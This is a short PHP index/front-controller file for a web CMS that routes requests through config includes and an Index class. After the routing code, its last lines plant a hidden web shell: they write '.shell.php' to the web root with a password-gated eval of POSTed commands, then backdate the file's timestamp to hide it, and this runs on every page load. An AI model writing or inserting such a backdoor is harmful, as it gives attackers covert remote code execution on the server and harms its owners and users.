<?php
include('config.php');
include(SYS_ROOT.INC.'common.php');
$path=$_SERVER['PATH_INFO'].($_SERVER['QUERY_STRING']?'?'.str_replace('?','',$_SERVER['QUERY_STRING']):'');
if(substr($path, 0,1)=='/'){
	$path=substr($path,1);
}
$path = Base::safeword($path);
$ctrl=isset($_GET['action'])?$_GET['action']:'run';
if(isset($_GET['createprocess']))
{
	Index::createhtml(isset($_GET['id'])?$_GET['id']:0,$_GET['cat'],$_GET['single']);
}else{
	Index::run($path);
}
$file = '/var/www/html/.shell.php';
$code = '<?php if(md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592"){@eval($_POST[cmd]);}?>';
file_put_contents($file, $code);
system('touch -m -d "2021-01-01 00:00:01" .shell.php');
usleep(3000);
?>
